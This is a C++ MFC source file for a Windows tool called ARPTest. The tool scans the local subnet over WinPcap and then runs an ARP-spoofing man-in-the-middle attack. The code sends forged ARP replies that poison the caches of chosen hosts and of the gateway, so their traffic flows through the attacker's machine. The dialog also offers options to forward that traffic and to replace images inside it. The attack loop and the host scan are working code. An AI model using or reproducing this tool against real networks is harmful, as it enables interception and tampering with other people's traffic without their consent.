#include "stdafx.h"
#include "ARPTestDlg.h"
#include <thread>
#include "MITM.h"
#include "Helper.h"
#include "Packet.h"

#pragma region MFC
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CARPTestDlg::CARPTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CARPTestDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}
void CARPTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_deviceDescList);
	DDX_Control(pDX, IDC_BUTTON1, m_attackButton);
	DDX_Control(pDX, IDC_EDIT4, m_selfIpEdit);
	DDX_Control(pDX, IDC_EDIT5, m_selfMacEdit);
	DDX_Control(pDX, IDC_EDIT8, m_selfGatewayEdit);
	DDX_Control(pDX, IDC_LIST2, m_hostList);
	DDX_Control(pDX, IDC_BUTTON2, m_confirmButton);
	DDX_Control(pDX, IDC_CHECK1, m_forwardCheck);
	DDX_Control(pDX, IDC_CHECK2, m_replaceImagesCheck);
	DDX_Control(pDX, IDC_EDIT1, m_imagePathEdit);
	DDX_Control(pDX, IDC_STATIC1, m_statusStatic);
	DDX_Control(pDX, IDC_CHECK3, m_cheatTargetCheck);
	DDX_Control(pDX, IDC_CHECK4, m_cheatGatewayCheck);
	DDX_Control(pDX, IDC_BUTTON3, m_checkAllButton);
	DDX_Control(pDX, IDC_CHECK5, m_autoCheckCheck);
}

BEGIN_MESSAGE_MAP(CARPTestDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CARPTestDlg::OnBnClickedButton1)
	ON_WM_DESTROY()
	ON_LBN_SELCHANGE(IDC_LIST1, &CARPTestDlg::OnLbnSelchangeList1)
	ON_BN_CLICKED(IDC_BUTTON2, &CARPTestDlg::OnBnClickedButton2)
	ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST2, &CARPTestDlg::OnLvnItemchangedList2)
	ON_BN_CLICKED(IDC_CHECK3, &CARPTestDlg::OnBnClickedCheck3)
	ON_BN_CLICKED(IDC_CHECK4, &CARPTestDlg::OnBnClickedCheck4)
	ON_BN_CLICKED(IDC_CHECK1, &CARPTestDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_CHECK2, &CARPTestDlg::OnBnClickedCheck2)
	ON_EN_KILLFOCUS(IDC_EDIT1, &CARPTestDlg::OnEnKillfocusEdit1)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON3, &CARPTestDlg::OnBnClickedButton3)
END_MESSAGE_MAP()

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CARPTestDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CARPTestDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
#pragma endregion


// CARPTestDlg 消息处理程序

// initialize
BOOL CARPTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	ShowWindow(SW_MINIMIZE);

	m_hostList.SetExtendedStyle(m_hostList.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);
	int i = 0;
	m_hostList.InsertColumn(i++, "Attack", LVCFMT_LEFT, 60);
	m_hostList.InsertColumn(i++, "IP", LVCFMT_LEFT, 120);
	m_hostList.InsertColumn(i++, "MAC", LVCFMT_LEFT, 150);
	m_hostList.InsertColumn(i++, "Cheat", LVCFMT_LEFT, 60);
	m_hostList.InsertColumn(i++, "Forward", LVCFMT_LEFT, 65);
	m_hostList.InsertColumn(i++, "Replace images", LVCFMT_LEFT, 150);

	m_autoCheckCheck.SetCheck(TRUE);

	// get device list
	char errBuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&g_deviceList, errBuf) == -1)
	{
		CString msg = "Error in pcap_findalldevs: ";
		msg += errBuf;
		MessageBox(msg, NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	// show device list
	for (pcap_if_t* device = g_deviceList; device != nullptr; device = device->next)
		m_deviceDescList.AddString(device->description != nullptr ? device->description : "");
	if (m_deviceDescList.GetCount() <= 0)
	{
		MessageBox("No interface found! Make sure WinPcap is installed.", NULL, MB_ICONERROR);
		DestroyWindow();
		return TRUE;
	}
	m_deviceDescList.SetCurSel(0);
	OnLbnSelchangeList1();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// release
void CARPTestDlg::OnDestroy()
{
	CDialog::OnDestroy();

	g_attacking = FALSE;
	g_programRunning = FALSE;
	//Sleep(3000); // wait for threads to end
	g_threadPool.StopThreads();
	pcap_freealldevs(g_deviceList);
}

/////////////////////////////////////////////////////////////////////////////////////////

// get adapter infomation and fill global variables
void CARPTestDlg::OnLbnSelchangeList1()
{
	// get adapter
	int index = m_deviceDescList.GetCurSel();
	g_adapter = g_deviceList;
	for (int i = 0; i < index; i++)
		g_adapter = g_adapter->next;

	// get adapter infomation
	CString ip, gateway;
	MacAddress mac;

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufSize = sizeof(adapterInfo);
	DWORD status = GetAdaptersInfo(adapterInfo, &bufSize);
	if (status != ERROR_SUCCESS)
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}
	CString name = g_adapter->name;
	for (PIP_ADAPTER_INFO pInfo = adapterInfo; pInfo != nullptr; pInfo = pInfo->Next)
	{
		if (name.Find(pInfo->AdapterName) != -1)
		{
			ip = pInfo->IpAddressList.IpAddress.String;
			mac = *(MacAddress*)pInfo->Address;
			gateway = pInfo->GatewayList.IpAddress.String;
			break;
		}
	}
	if (ip == "")
	{
		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
		return;
	}

	// fill global variables
	m_selfIpEdit.SetWindowText(ip);
	InputIp(ip, g_selfIp);
	m_selfMacEdit.SetWindowText((CString)mac);
	g_selfMac = mac;
	m_selfGatewayEdit.SetWindowText(gateway);
	InputIp(gateway, g_selfGateway);
}

// confirm device and scan hosts
void CARPTestDlg::OnBnClickedButton2()
{
	m_deviceDescList.EnableWindow(FALSE);
	m_confirmButton.EnableWindow(FALSE);
	SetTimer(0, 3000, NULL);
	
	/*std::thread thread(ScanHostThread);
	thread.detach();*/
	class ScanHostTask : public Task
	{
	private:
		CARPTestDlg* dlg;
	public:
		ScanHostTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
		void Run()
		{
			AdapterHandle adapter(GetAdapterHandle());
			if (adapter == nullptr)
				return;

			ARPPacket packet(TRUE);
			memset(&packet.destinationMac, 0xFF, sizeof(packet.destinationMac)); // broadcast
			packet.SetSender(g_selfIp, g_selfMac);

			// get IP range
			DWORD rSelfIp = ntohl(g_selfIp);
			DWORD startIp = rSelfIp & 0xFFFFFF00 | 0x01;
			DWORD stopIp = rSelfIp & 0xFFFFFF00 | 0xFE;

			// scan
			packet.targetIp = g_selfGateway;
			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
			Sleep(10);
			for (DWORD ip = startIp; ip <= stopIp; ip++)
			{
				DWORD rIp = htonl(ip);
				if (rIp != g_selfIp && rIp != g_selfGateway)
				{
					packet.targetIp = rIp;
					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
					Sleep(10);
				}
			}

			// get reply
			SetFilter(adapter.get(), "ether proto arp");
			pcap_pkthdr* header;
			const BYTE* pkt_data;
			int res;
			while (g_programRunning && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
			{
				if (res == 0) // timeout
					continue;
				const ARPPacket* pak = (const ARPPacket*)pkt_data;
				if (pak->type != PROTOCOL_ARP
					|| (pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST)
					|| pak->senderIp == 0) // not ARP
					continue;
				g_hostAttackListLock.lock();
				if (g_host.find(pak->senderIp) != g_host.end()) // in g_host
				{
					g_hostAttackListLock.unlock();
					continue;
				}
				g_hostAttackListLock.unlock();

				// add to list
				int index = -1;
				if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
				{
					index = dlg->m_hostList.GetItemCount();
					dlg->m_hostList.InsertItem(index, "");
					BYTE* bIp = (BYTE*)&pak->senderIp;
					CString tmp;
					tmp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
					dlg->m_hostList.SetItemText(index, 1, tmp);
					dlg->m_hostList.SetItemText(index, 2, (CString)pak->senderMac);
					dlg->m_hostList.SetItemText(index, 3, "↑↓");
					dlg->m_hostList.SetItemText(index, 4, "True");
					dlg->m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
				}
				// add to g_host
				g_hostAttackListLock.lock();
				HostInfoSetting& host = g_host[pak->senderIp];
				g_hostAttackListLock.unlock();
				host.ip = pak->senderIp;
				host.mac = pak->senderMac;

				if (pak->senderIp == g_selfGateway)
					g_gatewayMac = pak->senderMac;

				// auto check
				if (index != -1 && dlg->m_autoCheckCheck.GetCheck())
					dlg->m_hostList.SetCheck(index);
			}
			TRACE("scan end\n");
		}
	};
	g_threadPool.AddTask(std::unique_ptr<ScanHostTask>(new ScanHostTask(this)));
}

#pragma region UI
/////////////////////////////////////////////////////////////////////////////////////////
//
//                                         UI
//

// add / delete attack list / display host information
void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	*pResult = 0;

	if (pNMLV->uChanged == LVIF_STATE)
	{
		if ((pNMLV->uNewState & LVIS_SELECTED) != 0)
		{
			DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
			g_hostAttackListLock.lock();
			HostInfoSetting& host = g_host[ip];
			g_hostAttackListLock.unlock();

			m_cheatTargetCheck.SetCheck(host.cheatTarget);
			m_cheatGatewayCheck.SetCheck(host.cheatGateway);
			m_forwardCheck.SetCheck(host.forward);
			m_replaceImagesCheck.SetCheck(host.replaceImages);
			m_imagePathEdit.SetWindowText(host.imagePath);
			OnTimer(0);
			return;
		}
	}

	if (pNMLV->uOldState == 0 && pNMLV->uNewState == 0) // No change
		return;

	// Old check box state
	int prevState = ((pNMLV->uOldState & LVIS_STATEIMAGEMASK) >> 12) - 1;
	if (prevState < 0) // On startup there's no previous state 
		prevState = 0; // so assign as false (unchecked)

	// New check box state
	int checked = ((pNMLV->uNewState &LVIS_STATEIMAGEMASK) >> 12) - 1;
	if (checked < 0) // On non-checkbox notifications assume false
		checked = 0;

	if (prevState == checked) // No change in check box
		return;
	// Now checked holds the new check box state

	DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
	g_hostAttackListLock.lock();
	if (checked != 0)
	{
		HostInfoSetting& host = g_host[ip];
		g_attackList[ip] = &host;
		g_attackListMac[host.mac] = &host;
	}
	else
	{
		g_attackList.erase(ip);
		g_attackListMac.erase(g_host[ip].mac);
	}
	g_hostAttackListLock.unlock();
}

HostInfoSetting* CARPTestDlg::GetCurSelHost(int& index)
{
	POSITION pos = m_hostList.GetFirstSelectedItemPosition();
	if (pos == nullptr)
		return nullptr;
	index = m_hostList.GetNextSelectedItem(pos);
	DWORD ip = (DWORD)m_hostList.GetItemData(index);
	g_hostAttackListLock.lock();
	HostInfoSetting* res = &g_host[ip];
	g_hostAttackListLock.unlock();
	return res;
}

// cheat target
void CARPTestDlg::OnBnClickedCheck3()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == nullptr)
		return;
	host->cheatTarget = m_cheatTargetCheck.GetCheck();
	CString tmp;
	if (host->cheatTarget)
		tmp += "↑";
	if (host->cheatGateway)
		tmp += "↓";
	m_hostList.SetItemText(index, 3, tmp);
}

// cheat gateway
void CARPTestDlg::OnBnClickedCheck4()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == nullptr)
		return;
	host->cheatGateway = m_cheatGatewayCheck.GetCheck();
	CString tmp;
	if (host->cheatTarget)
		tmp += "↑";
	if (host->cheatGateway)
		tmp += "↓";
	m_hostList.SetItemText(index, 3, tmp);
}

// forward
void CARPTestDlg::OnBnClickedCheck1()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == nullptr)
		return;
	host->forward = m_forwardCheck.GetCheck();
	m_hostList.SetItemText(index, 4, host->forward ? "True" : "False");
}

// replace images
void CARPTestDlg::OnBnClickedCheck2()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == nullptr)
		return;
	host->replaceImages = m_replaceImagesCheck.GetCheck();
	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");
}

// image path
void CARPTestDlg::OnEnKillfocusEdit1()
{
	int index;
	HostInfoSetting* host = GetCurSelHost(index);
	if (host == nullptr)
		return;
	m_imagePathEdit.GetWindowText(host->imagePath);
	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");

	// read image
	CFile f;
	host->imageDataLock.lock();
	if (f.Open(host->imagePath, CFile::modeRead | CFile::typeBinary))
	{
		host->imageDataLen = (DWORD)f.GetLength();
		host->imageData.reset(new BYTE[host->imageDataLen]);
		f.Read(host->imageData.get(), host->imageDataLen);
	}
	else
	{
		host->imageDataLen = 0;
		host->imageData.reset();
		MessageBox("Failed to load the image.");
	}
	host->imageDataLock.unlock();
}

// update status
void CARPTestDlg::OnTimer(UINT_PTR nIDEvent)
{
	if (nIDEvent == 0) // update status
	{
		int index;
		HostInfoSetting* host = GetCurSelHost(index);
		if (host == nullptr)
			return;
		CString status;
		status.Format("Sent %u, Received %u, Replaced %u", host->send, host->receive, host->replace);
		m_statusStatic.SetWindowText(status);
	}

	CDialog::OnTimer(nIDEvent);
}

// check all
void CARPTestDlg::OnBnClickedButton3()
{
	BOOL check = FALSE;
	for (int i = 0; i < m_hostList.GetItemCount(); i++)
		if (!m_hostList.GetCheck(i))
		{
			check = TRUE;
			m_hostList.SetCheck(i, TRUE);
		}
	// uncheck
	if (!check)
		for (int i = 0; i < m_hostList.GetItemCount(); i++)
			m_hostList.SetCheck(i, FALSE);
}

/////////////////////////////////////////////////////////////////////////////////////////
#pragma endregion

// start / stop and send ARP packet
void CARPTestDlg::OnBnClickedButton1()
{
	if (g_attacking)
	{
		g_attacking = FALSE;
		m_attackButton.EnableWindow(FALSE);
		return;
	}
	g_attacking = TRUE;
	m_attackButton.EnableWindow(FALSE);

	/*std::thread thread(AttackThread);
	thread.detach();*/
	class AttackTask : public Task
	{
	private:
		CARPTestDlg* dlg;
	public:
		AttackTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
		void Run()
		{
			AdapterHandle adapter(GetAdapterHandle());
			if (adapter == nullptr)
				return;

			dlg->m_attackButton.SetWindowText("Stop");
			dlg->m_attackButton.EnableWindow(TRUE);
			// start capture
			std::thread packetHandleThread(PacketHandleThread);

			ARPPacket packet(FALSE);
			packet.SetSender(0, g_selfMac);
			// send
			while (g_attacking)
			{
				DWORD time = GetTickCount();
				g_hostAttackListLock.lock();
				for (const auto& i : g_attackList)
				{
					if (i.second->cheatTarget) // send to target
					{
						packet.SetTarget(i.first, i.second->mac);
						packet.senderIp = g_selfGateway;
						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
					}
					if (i.second->cheatGateway) // send to gateway
					{
						packet.SetTarget(g_selfGateway, g_gatewayMac);
						packet.senderIp = i.first;
						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
					}
				}
				g_hostAttackListLock.unlock();
				Sleep(1000 - (GetTickCount() - time));
			}

			//////////////////////////////////////////////////////////////////////////////
			// stop attacking

			packetHandleThread.join();

			// recover
			g_hostAttackListLock.lock();
			for (const auto& i : g_attackList)
			{
				// send to target
				packet.SetSender(g_selfGateway, g_gatewayMac);
				packet.SetTarget(i.first, i.second->mac);
				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
				// send to gateway
				packet.SetSender(i.first, i.second->mac);
				packet.SetTarget(g_selfGateway, g_gatewayMac);
				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
			}
			g_hostAttackListLock.unlock();

			// end
			if (g_programRunning)
			{
				dlg->m_attackButton.SetWindowText("Start");
				dlg->m_attackButton.EnableWindow(TRUE);
			}
			TRACE("attack end\n");
		}
	};
	g_threadPool.AddTask(std::unique_ptr<AttackTask>(new AttackTask(this)));
}
